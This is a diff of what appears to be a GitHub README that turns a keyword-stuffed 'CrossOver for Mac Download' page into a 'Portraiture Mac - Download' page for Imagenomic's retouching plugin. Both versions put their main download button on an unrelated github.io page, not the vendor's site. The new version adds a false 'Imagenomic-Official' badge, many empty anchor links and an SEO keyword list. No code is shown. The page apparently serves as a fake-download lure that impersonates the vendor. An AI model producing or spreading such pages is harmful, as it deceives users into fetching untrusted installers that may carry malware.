@@ -1,187 +1,260 @@
 <p align="center">
-  <img src="https://www.techspot.com/images2/downloads/topdownload/2023/08/2023-08-17-ts3_thumbs-205.png" width="110" alt="CrossOver for Mac Download — Windows compatibility layer icon"/>
+  <img src="https://www.dayanzai.me/wp-content/uploads/2022/11/Portraiture.png" width="110" alt="Portraiture logo — Imagenomic portrait retouching plugin for Mac"/>
 </p>
 
-<h1 align="center">CrossOver for Mac Download</h1>
+<h1 align="center">Portraiture Mac - Download</h1>
 
 <p align="center">
-  <a href="#">CrossOver download for Mac</a> — CodeWeavers' Windows application compatibility
-  layer that runs Windows software directly on macOS without a Windows license. Based on Wine,
-  CrossOver translates Windows API calls to native macOS calls. Supports Intel Macs natively
-  and Apple Silicon M1, M2, M3, M4 through instruction translation.
+  <a href="#">Portraiture Mac</a> — Imagenomic's professional portrait retouching plugin for
+  Adobe Photoshop and Lightroom on macOS. Automatically smooths skin texture, removes blemishes,
+  and reduces fine lines while preserving hair, eyebrows, eyelashes, lips, and clothing detail —
+  delivering natural-looking retouching results with a single filter application. Available for
+  Intel and Apple Silicon M1 Macs.
 </p>
 
 <p align="center">
   <img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/Apple_Silicon-M1%2FM2%2FM3-brightgreen?style=flat-square"/>
+  <img src="https://img.shields.io/badge/Apple_Silicon-M1%2FM2-orange?style=flat-square"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/No_Windows-Needed-blue?style=flat-square"/>
+  <img src="https://img.shields.io/badge/Photoshop-Lightroom-blue?style=flat-square"/>
   &nbsp;
-  <img src="https://img.shields.io/badge/14_Day-Free_Trial-orange?style=flat-square"/>
+  <img src="https://img.shields.io/badge/Imagenomic-Official-red?style=flat-square"/>
 </p>
 
-<p align="center">
-  <a href="https://bruxmen.github.io/.github/crossover-mac">
-    <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png"
-         alt="Download CrossOver for Mac — run Windows apps without Windows" width="160"/>
-  </a>
-</p>
+---
+
+| [![Download Portraiture for Mac](https://i.postimg.cc/hjPfG0vF/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png)](https://pudge-wagner.github.io/.github/portraiture-mac) | **Professional portrait retouching plugin for Mac — one filter, natural results** <br><br> Install <a href="#">Imagenomic Portraiture Mac</a>, open a portrait in Photoshop, apply the filter from Filter → Imagenomic → Portraiture. The plugin automatically detects skin and smooths it while preserving every non-skin detail — hair, eyes, lips, and clothing stay sharp. |
+|---|---|
+
+---
 
 <p align="center">
-  <img src="https://media.codeweavers.com/pub/crossover/website/htmlimages/Screenshot-2023-03-02-at-1.54.37-PM.png"
-       alt="CrossOver Mac — Windows application running in macOS window without virtualization"
+  <img src="https://imagenomic.com/images/Installation/pt4/ps/4.png"
+       alt="Portraiture 4 for Mac — Photoshop plugin interface with skin smoothing controls and masking"
        width="800"/>
 </p>
 
 ---
 
-## CrossOver for Mac — Technical Deep Dive
+## What Is Imagenomic Portraiture for Mac
 
-<a href="#">CrossOver Mac</a> from CodeWeavers is the only practical way to run Windows
-applications on a Mac without purchasing a Windows license and installing a full Windows
-virtual machine. For users who need one or a few specific Windows applications that have no
-Mac equivalent, CrossOver eliminates the overhead of maintaining a full Windows environment
-just for those applications.
+<a href="#">Imagenomic Portraiture Mac</a> is a professional portrait retouching plugin for
+Adobe Photoshop and Adobe Lightroom developed by Imagenomic. The plugin's core function is
+intelligent skin retouching: it analyzes the image, identifies skin-tone pixels, applies
+smoothing and texture reduction only to those pixels, and preserves the sharpness and detail
+of everything else — hair, eyebrows, eyelashes, eyes, lips, teeth, and clothing.
 
-Understanding CrossOver requires understanding its technical foundation: <a href="#">Wine CrossOver
-Mac</a> — Wine is the open-source project that implements the Windows programming interface
-(API) for Unix systems. Wine is not emulation — it re-implements Windows system calls using
-native system calls on the host operating system (macOS in this case). Application code runs
-at full native processor speed; only the interface with the operating system is translated.
+Manual portrait retouching in Photoshop — frequency separation, dodge and burn, healing brush
+work, and custom masking — produces excellent results but requires significant skill and time.
+<a href="#">Portraiture plugin for Photoshop Mac</a> achieves comparable skin smoothing results
+in a fraction of the time, making it the standard tool in portrait photography workflows where
+speed is as important as quality.
 
----
+<a href="#">Portraiture Mac</a> is used by portrait photographers, retouchers, commercial
+photographers, and headshot studios. The time savings are substantial: a professionally retouched
+portrait headshot that takes 30–45 minutes of manual Photoshop work can achieve comparable
+skin quality with Portraiture in under 5 minutes.
 
-## The CrossOver Compatibility Experience
-
-### What "Works" Means
-
-Application compatibility in CrossOver exists on a spectrum. The CrossOver compatibility
-database at codeweavers.com rates thousands of tested applications:
-
-**Platinum**: The application installs and runs with no known issues. Functions identically
-to the Windows experience. This is the ideal compatibility level and where many office
-productivity applications fall.
-
-**Gold**: The application works with minor issues that do not significantly affect usability.
-Minor graphical glitches, specific features that do not work, or installation requiring manual
-steps. The application is fully usable for its primary purpose.
-
-**Silver**: The application works but with notable issues that affect some use cases. Core
-functionality is accessible but advanced features may fail or produce incorrect results.
-
-**Bronze**: The application launches and some features work but usability is significantly
-compromised. Only appropriate for users willing to work around substantial limitations.
-
-**Garbage**: The application does not work usefully in CrossOver. These ratings guide users
-away from attempting installations that will be frustrating.
+<a href="#">Imagenomic Portraiture download</a> is available from Imagenomic's website at
+imagenomic.com. A fully functional 30-day free trial allows evaluation of the plugin's results
+before purchase.
 
 ---
 
-## Wine and CodeWeavers' Contribution
+## How Portraiture Works: Skin Detection and Masking
 
-<a href="#">CrossOver Codeweavers Mac</a> represents CodeWeavers' commercial investment in the
-Wine open-source project. CodeWeavers is the largest corporate contributor to Wine, employing
-Wine developers who work on improving compatibility for specific applications.
+<a href="#">Portraiture plugin for Photoshop Mac</a> separates retouching from masking —
+the two tasks that consume the most time in manual portrait retouching — into an automated
+single-pass operation:
 
-The relationship between CrossOver and Wine is bidirectional: CodeWeavers identifies
-compatibility problems in customer-reported application failures, develops fixes in the Wine
-codebase, and releases those fixes to the open-source community. The Wine project benefits
-from CodeWeavers' commercial focus on specific high-demand applications; CrossOver benefits
-from the entire Wine community's contributions.
+### Automatic Skin Detection
 
-<a href="#">Cross over macOS</a> purchasers directly fund this Wine development through their
-subscription payments.
+When the filter is applied to a portrait, Portraiture automatically samples the skin tone
+from the image and builds a mask that identifies skin pixels. The skin detection is range-based —
+it identifies a hue, saturation, and luminosity range that encompasses the skin in the image
+and masks only pixels within that range.
 
----
+The automatic detection handles the full range of skin tones across ethnicities and lighting
+conditions. The detection adapts to the specific skin color in each image rather than using
+a fixed skin-tone range, ensuring accurate masking for light, medium, and dark complexions
+under diverse lighting.
 
-## CrossOver Mac for Games: The Steam Use Case
+### Manual Skin Tone Sampling
 
-<a href="#">CrossOver Mac</a> gaming use case is one of its most popular applications. macOS
-receives a fraction of game releases compared to Windows, and many popular titles never receive
-a Mac port.
+When the automatic detection does not precisely cover the skin in a specific image — such as
+portraits with unusual lighting, strong color casts, or very light or dark skin at the extremes —
+the eyedropper tool samples a skin area directly from the image to set the detection range.
+The sampled color expands the detection range to include the skin in that specific image.
 
-CrossOver's approach to gaming has evolved with the availability of DXVK (DirectX-to-Vulkan
-translation for Wine) and MoltenVK (Vulkan-to-Metal translation for macOS), which together
-form a translation chain:
-
-Windows game uses DirectX graphics API → DXVK translates DirectX to Vulkan API → MoltenVK
-translates Vulkan to macOS's Metal graphics API → Metal runs on the Mac GPU.
-
-This multi-layer graphics translation enables DirectX 9, 10, and 11 games to run on Mac
-through CrossOver with reasonable performance on current Mac hardware.
-
-**Steam on CrossOver**: Installing Steam for Windows through <a href="#">CrossOver application
-Mac</a> provides access to the Windows Steam client and the Windows-compatible game library
-from within macOS. The Steam client runs through CrossOver, and games installed through this
-Steam instance also run through CrossOver.
+The range sliders (hue range, saturation range, luminosity range) provide fine-grained control
+over which pixels are included in the skin mask. Expanding the range adds adjacent pixels to
+the smoothing; narrowing it protects near-skin colors (lips, warm clothing, wood backgrounds)
+from being included.
 
 ---
 
-## CrossOver Mac Office: Windows Application Access
+## Portraiture Smoothing Controls
 
-<a href="#">CrossOver Office Mac</a> enables access to Windows-only office and productivity
-applications:
+<a href="#">Portraiture 3 Mac</a> and <a href="#">Portraiture 4 Mac</a> provide layered smoothing
+controls for different aspects of skin texture:
 
-**Microsoft Office for Windows versions**: Older Microsoft Office versions (2010, 2013, 2016)
-that include features not available in the Mac versions, or enterprise macro configurations
-tested only against Windows Office, run through CrossOver.
+### Threshold
 
-**Windows-only business applications**: Industry-specific software that has never received
-a Mac version — accounting software, engineering utilities, specialized databases, legacy
-enterprise systems — is accessible through CrossOver for Mac users who cannot migrate away
-from these applications.
+The Threshold parameter controls the sensitivity of the smoothing — how much variation in
+skin tone the plugin considers noise versus real skin texture. Low threshold settings produce
+subtle, natural smoothing that reduces blemishes while preserving skin pores and micro-texture.
+High threshold settings produce heavier smoothing appropriate for beauty retouching and
+cosmetic advertising.
 
-**Legacy applications**: Applications that were discontinued before receiving a Mac port but
-must be maintained for accessing historical data continue running through CrossOver on current
-Mac hardware.
+### Smoothing Layers
+
+<a href="#">Imagenomic Portraiture Mac</a> applies smoothing in three independent frequency
+layers:
+
+**Fine details**: The finest texture layer — pores, fine lines, and small surface irregularities.
+Smoothing the fine layer removes pores and fine texture, reducing skin roughness to a finer-
+grained smoothness.
+
+**Medium details**: Mid-range skin texture — small blemishes, acne marks, uneven texture
+areas. Smoothing the medium layer addresses the skin irregularities that are visible at
+portrait viewing distance.
+
+**Large details**: Large-scale tonal variation — shadows under eyes, redness, and larger
+color patches. Smoothing at this scale reduces tonal inconsistency across the skin area.
+
+Each layer has an independent strength control, allowing precise calibration of how much
+smoothing is applied at each spatial scale. This layered approach produces results that look
+natural at different viewing sizes — the portrait looks smooth at full size but retains
+realistic skin character at close inspection.
+
+### Sharpening
+
+After smoothing is applied, Portraiture's sharpening control recovers fine edge detail in
+the smoothed areas. Since smoothing inherently reduces edge contrast alongside texture,
+post-smoothing sharpening restores the definition of pores and fine skin lines at a level
+appropriate for the retouching intent.
 
 ---
 
-## CrossOver Mac Black Friday and Sales
+## Portraiture in Photoshop: Workflow
 
-<a href="#">CrossOver Mac black friday</a> and <a href="#">CrossOver Mac sale</a> events occur
-through CodeWeavers' periodic promotional pricing. CodeWeavers typically offers significant
-discounts during Black Friday, holiday seasons, and occasional promotional events.
+<a href="#">Portraiture photoshop Mac</a> workflow integrates naturally into the standard
+portrait editing session:
 
-Purchasing during a sale or using a promotional code provides the best value on the
-<a href="#">CrossOver Mac full</a> license. Perpetual licenses purchased during promotions
-retain their discount price permanently.
+**Non-destructive smart filter**: Apply Portraiture as a Smart Filter on a Smart Object layer.
+The smoothing is applied non-destructively — the filter settings remain editable and the
+original pixel data is preserved. Re-opening the smart filter shows the Portraiture interface
+with the original settings for adjustment.
+
+**Standard adjustment layer workflow**: Apply Portraiture on a duplicate layer and use the
+layer opacity to blend between the retouched and original versions for additional control over
+the retouching strength. This approach is favored by retouchers who want per-image opacity
+fine-tuning without adjusting the plugin settings.
+
+**Batch action**: Portraiture runs within Photoshop Actions, enabling batch processing of
+multiple portraits with the same settings — applying consistent smoothing strength to an
+entire portrait session automatically.
+
+---
+
+## Portraiture Lightroom Mac
+
+<a href="#">Portraiture Lightroom Mac</a> provides the same skin smoothing capability within
+Adobe Lightroom Classic as an external editor plugin. The Lightroom integration:
+
+**Edit In workflow**: Right-click a portrait in Lightroom, select Edit In → Imagenomic Portraiture,
+the image opens in Portraiture's standalone interface, retouching is applied, and the result
+saves back to the Lightroom catalog as a TIFF or PSD alongside the original.
+
+**Batch retouching**: Multiple images from the same session can be processed through Portraiture
+from Lightroom in sequence, applying consistent settings across the entire session.
+
+The Lightroom workflow is favored by photographers who use Lightroom as their primary editing
+and culling tool and want to apply Portraiture without opening the full Photoshop environment
+for skin retouching.
+
+---
+
+## Portraiture Version History
+
+### Portraiture 2 for Mac
+
+<a href="#">Imagenomic Portraiture 2 Mac</a> and <a href="#">Portraiture 2 Mac</a> represent
+the previous major version widely used before version 3. Portraiture 2 established the layered
+smoothing controls and skin detection approach that define the plugin's workflow. Users with
+version 2 licenses can continue using the version 2 plugin in compatible Photoshop versions.
+
+### Portraiture 3 for Mac
+
+<a href="#">Imagenomic Portraiture 3 Mac</a> and <a href="#">Portraiture 3 for Mac</a>
+introduced an updated interface, improved masking algorithm, better handling of diverse skin
+tones, and performance improvements for large resolution images. <a href="#">Portraiture 3 Mac</a>
+is compatible with Photoshop CC 2019 through CC 2022.
+
+### Portraiture 4 Mac
+
+<a href="#">Portraiture 4 Mac</a> is the current version, introducing full <a href="#">Portraiture
+Mac M1</a> native support with a Universal Binary build for Apple Silicon. Version 4 adds
+improved AI-assisted skin detection, updated Lightroom compatibility, and performance improvements
+on current Photoshop versions.
+
+---
+
+## Portraiture for Photoshop 2021 and 2022 Mac
+
+<a href="#">Portraiture photoshop 2021 Mac</a> and <a href="#">Portraiture photoshop 2022 Mac</a>
+compatibility is provided through the version 3 and version 4 installers. The current Portraiture
+version is compatible with Photoshop 2020 through the current Creative Cloud release.
+
+Installing Portraiture on Mac places the plugin in the Photoshop plug-ins directory, where
+it appears in the Filter → Imagenomic menu in every compatible Photoshop version installed
+on the Mac.
+
+---
+
+## Imagenomic Portraiture Mac M1
+
+<a href="#">Imagenomic Portraiture Mac M1</a>, <a href="#">Portraiture Mac M1</a>, and
+<a href="#">Portraiture for Mac M1</a> refer to Apple Silicon native support. Portraiture 4
+is a Universal Binary that runs natively on M1, M2, M3, and M4 Apple Silicon Macs. Native
+execution provides significantly better filter performance on Apple Silicon compared to running
+the Intel version under Rosetta 2 emulation.
 
 ---
 
 ## System Requirements
 
-| Specification | Requirement |
+| Requirement | Specification |
 |---|---|
 | macOS | 10.15 Catalina or later |
-| Architecture | Intel native; M1–M4 via x86 translation |
+| Architecture | Universal Binary (v4) — Apple Silicon and Intel |
+| Photoshop | CC 2019 through current Creative Cloud |
+| Lightroom | Lightroom Classic 9.0 or later |
 | RAM | 4 GB minimum, 8 GB recommended |
-| Disk | 500 MB CrossOver + app storage |
-| License | Annual subscription or one-time perpetual |
+| License | Purchase from imagenomic.com — 30-day trial available |
 
 ---
 
 ## Frequently Asked Questions
 
-**Is CrossOver legal?**
-Yes. <a href="#">CrossOver Mac software</a> is a legitimate commercial product from CodeWeavers
-that does not require, install, or include any Microsoft software.
+**Does Portraiture work in Lightroom on Mac?**
+Yes. <a href="#">Portraiture Lightroom Mac</a> works in Lightroom Classic through the Edit In
+external editor workflow.
 
-**Does CrossOver run all Windows apps?**
-<a href="#">CrossOver application Mac</a> runs many but not all Windows applications. Compatibility
-varies by application — check the database at codeweavers.com before purchasing.
+**Does Portraiture 4 work on Apple Silicon Macs?**
+Yes. <a href="#">Portraiture Mac M1</a> — version 4 is a Universal Binary with native M1/M2/M3/M4 support.
 
-**How is CrossOver different from Wine?**
-<a href="#">Wine CrossOver Mac</a> — Wine is the open-source foundation; CrossOver is the
-commercial product with installation management, tested app configurations, and paid support.
+**Is there a free trial?**
+Yes. <a href="#">Imagenomic Portraiture free download Mac</a> — a 30-day trial is available
+from imagenomic.com with full functionality.
 
-**Does CrossOver work on M1/M2 Macs?**
-Yes. <a href="#">CrossOver Mac M1</a> uses instruction translation to run Intel Windows apps on
-Apple Silicon, though at reduced performance compared to Intel Macs.
+**What is the difference between Portraiture 3 and 4?**
+<a href="#">Portraiture 3 Mac</a> introduced improved skin detection. <a href="#">Portraiture 4 Mac</a>
+adds native Apple Silicon support, updated Photoshop/Lightroom compatibility, and AI detection improvements.
 
 ---
 
 ## Keywords
 
-crossover mac, crossover app for mac, crossover macbook, crossover application mac, crossover for mac os, crossover mac software, crossover office mac, crossover os x, cross over macos, crossover download for mac, crossover program mac, mac cross over, crossover mac m1, codeweavers crossover for mac, crossover codeweavers mac, crossover mac black friday, crossover mac sale, crossover mac to windows, crossover windows on mac, install crossover mac, wine crossover mac
+portraiture plugin for photoshop mac, potracher filter download for mac, portraiture mac, imagenomic portraiture mac, mac portraiture, portraiture 3 for mac, imagenomic portraiture 3 mac, imagenomic portraiture download, download portraiture for mac, imagenomic for mac, imagenomic portraiture 2 mac, imagenomic portraiture 3 for mac, imagenomic portraiture mac m1, portraiture 2 for mac, portraiture 2 mac, portraiture 3 mac, portraiture 3 mac m1, portraiture 4 mac, portraiture for mac m1, portraiture lightroom mac, portraiture mac m1, portraiture photoshop 2021 mac, portraiture photoshop 2022 mac, portraiture photoshop mac, portraiture plugin for mac
